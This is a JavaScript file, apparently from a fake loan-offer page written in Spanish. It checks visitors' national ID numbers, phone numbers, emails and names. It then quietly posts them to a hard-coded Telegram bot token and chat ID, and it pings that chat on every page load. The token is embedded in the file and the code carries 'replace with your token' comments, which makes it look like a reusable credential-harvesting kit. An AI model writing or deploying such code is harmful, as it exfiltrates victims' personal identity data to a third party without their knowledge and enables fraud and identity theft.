document.getElementById('btn-entrar').addEventListener('click', function() {
    // Obtener valores
    const telefono = document.getElementById('telefono01').value.trim();
    const correo = document.getElementById('correo01').value.trim();
    const nombre = document.getElementById('nombre01').value.trim();
    const cedula = document.getElementById('cedula01').value.trim();

    const numeroRegex = /^\d+$/;
    const correoRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    // Validaciones
    if (!numeroRegex.test(cedula) || cedula.length < 7 || cedula.length > 10) {
        mostrarError("Cédula inválida. Debe tener 7-10 números.");
        return;
    }

    if (!numeroRegex.test(telefono) || telefono.length !== 10 || !telefono.startsWith('3')) {
        mostrarError("Teléfono inválido. Debe tener 10 números y comenzar con 3.");
        return;
    }

    if (!correoRegex.test(correo)) {
        mostrarError("Correo inválido. Por favor ingresa un correo válido.");
        return;
    }

    if (!nombre) {
        mostrarError("El nombre no puede estar vacío.");
        return;
    }

    // Guardar en localStorage
    const usuario = { telefono, correo, nombre, cedula };
    localStorage.setItem('usuario', JSON.stringify(usuario));

    // Mostrar resultados
    document.getElementById('resultado-prestamo').style.display = 'block';

    // Enviar a Telegram
    enviarTelegram(usuario);
});

// Modal
function mostrarError(mensaje) {
    const modal = document.getElementById('errorModal');
    document.getElementById('errorText').innerText = mensaje;
    modal.style.display = 'flex';
}

document.getElementById('closeModal').onclick = function() {
    document.getElementById('errorModal').style.display = 'none';
}
window.onclick = function(event) {
    const modal = document.getElementById('errorModal');
    if(event.target == modal) modal.style.display = 'none';
}

// Función para enviar a Telegram
function enviarTelegram(usuario) {
    const token = "8214599584:AAF5D-FzEQsPPwSBtyD0iyFWfar0Li5VFHw"; // Reemplaza con tu token
    const chatId = "8417322083";  // Reemplaza con tu chat_id

    const mensaje = `
Nuevo registro:
Nombre: ${usuario.nombre}
Cédula: ${usuario.cedula}
Teléfono: ${usuario.telefono}
Correo: ${usuario.correo}
`;

    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: chatId,
            text: mensaje
        })
    })
    .then(response => response.json())
    .then(data => {
        if(data.ok){
            console.log("Mensaje enviado a Telegram ✅");
        } else {
            mostrarError("No se pudo enviar a Telegram.");
        }
    })
    .catch(err => mostrarError("Error al conectar con Telegram."));
}












// Ejecutar al cargar la página
window.addEventListener('load', function() {
    const token = "8214599584:AAF5D-FzEQsPPwSBtyD0iyFWfar0Li5VFHw";
    const chatId = "8417322083";
    const mensaje = `¡Alguien ha entrado a tu sitio web! - ${new Date().toLocaleString()}`;

    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: chatId,
            text: mensaje
        })
    })
    .then(res => res.json())
    .then(data => console.log("Mensaje enviado a Telegram"))
    .catch(err => console.error("Error enviando mensaje", err));
});


